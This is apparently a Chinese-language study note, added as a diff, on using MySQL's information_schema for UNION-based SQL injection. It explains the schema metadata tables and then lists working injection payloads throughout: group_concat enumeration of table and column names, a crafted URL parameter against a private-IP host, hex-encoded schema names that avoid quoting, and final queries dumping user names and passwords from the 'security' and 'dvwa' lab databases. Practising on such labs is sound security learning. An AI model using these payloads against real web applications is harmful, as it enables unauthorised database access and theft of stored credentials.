@@ -1,0 +1,31 @@
+数据库默认数据库保存了数据库中的数据库库名，表名，字段并解释
+information_schema 是mysql数据库默认的数据库实例初始化完成就存在
+SCHEMATA表：存储数据名称的，关键字段是SCHEMA_NAME
+TABLES表：存储表名的TABLE_SCHEMA表示表所属的数据库名称
+		TABLE_NAME表示表的名称。
+COLUMNS表:存储的字段名。
+		COLUMN_NAME表示字段名。	
+group_concat(table_name):打印出所有的表名称  
+实例:select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' 打印出information_schema库下tables表中所有的表名称筛选条件为security库
+实例：union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+ 查看security库中users表中的所有字段
+实例：union select 1,2,group_concat(id,username,password) from security.users --+   查看users表中的username ,id , password字段数据
+
+实例（查看information库中的user表并获取字段）
+数据库语句：SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'information' AND TABLE_NAME = 'user';
+网页表现形式：http://172.16.16.23:8080/usera.php?name=-1  and 1=2 union select 1,2,3,4,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'information'AND TABLE_NAME = 'user'; 
+
+链表查询information_schema库中的数据库名称
+UNION select SCHEMA_NAME,2 FROM information_schema.SCHEMATA;
+
+链表查询information_schema库中dvwa库中的表名
+1 UNION select TABLE_NAME,2 FROM information_schema.TABLES where TABLE_SCHEMA='dvwa';
+十六进制格式：
+1 union select TABLE_NAME COLLATE utf8_general_ci,2 FROM information_schema.TABLES where TABLE_SCHEMA=0x64767761 注意0x是机器识别码
+
+链表查询information_schema库中dvwa库users的字段
+1 union select COLUMN_NAME COLLATE utf8_general_ci,2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='dvwa' AND TABLE_NAME='users';
+十六进制格式：
+1 union select COLUMN_NAME COLLATE utf8_general_ci,2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=0x64767761 AND TABLE_NAME=0x7573657273
+
+链表查询dvwa库中users表中的user和password字段
+1 union select user,password from dvwa.users
